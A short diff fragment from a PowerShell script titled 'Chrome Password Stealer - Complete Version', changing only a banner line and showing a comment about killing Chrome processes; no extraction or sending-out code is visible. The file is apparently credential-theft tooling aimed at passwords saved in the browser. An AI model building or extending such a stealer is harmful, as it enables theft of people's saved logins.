@@ -1,6 +1,6 @@
 # Chrome Password Stealer - Complete Version
 
-Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
+Write-Host "=== Chrome Password Extractor asd ===" -ForegroundColor Cyan
 Write-Host ""
 
 # Kill Chrome processes
